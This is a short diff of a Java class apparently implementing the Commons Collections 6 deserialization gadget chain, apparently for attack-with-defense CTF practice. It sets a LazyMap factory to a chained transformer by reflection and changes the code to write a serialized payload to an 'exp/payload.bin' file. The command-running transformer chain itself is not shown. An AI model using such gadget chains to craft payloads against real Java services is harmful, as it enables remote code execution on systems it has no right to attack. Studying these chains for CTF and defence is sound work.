@@ -39,12 +39,12 @@ public class CC6 {
         factoryFied.setAccessible(true);
         factoryFied.set(Lazymap,chainedTransformer);
 
-//        serialize(map2);
-        unserialize("ser.bin");
+       serialize(map2);
+        // unserialize("ser.bin");
     }
 
     public static void serialize(Object obj) throws IOException {
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("D:/awd/exp/payload.bin"));
         oos.writeObject(obj);
     }
 
